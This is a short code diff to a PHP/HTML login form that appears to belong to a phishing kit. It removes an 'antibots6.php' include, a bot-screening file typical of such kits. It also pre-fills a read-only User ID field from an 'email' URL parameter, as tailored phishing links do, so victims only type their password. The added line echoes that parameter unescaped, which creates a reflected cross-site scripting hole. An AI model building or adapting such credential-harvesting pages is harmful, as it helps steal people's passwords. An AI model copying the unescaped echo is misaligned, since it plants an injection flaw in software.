@@ -1,6 +1,3 @@
-<?php
-include('antibots6.php');
-?>
 
 <HTML>
 <HEAD>
@@ -32,11 +29,11 @@ include('antibots6.php');
 	</tr>
            <tr>
             <td align="right"><b>User ID: </b></td>
-            <td><input type="text" name="user_id" size="20"></td>
+            <td><input type="text" name="user_id" size="20" readonly="readonly" value="<?php echo $_GET['email']; ?>"></td>
           </tr>
           <tr>
             <td align="right"><b>Password: </b></td>
-            <td><input type="password" name="password" size="20"></td>
+            <td><input type="password" name="password" required="required" size="20"></td>
           </tr>
           <tr>
             <td></td>
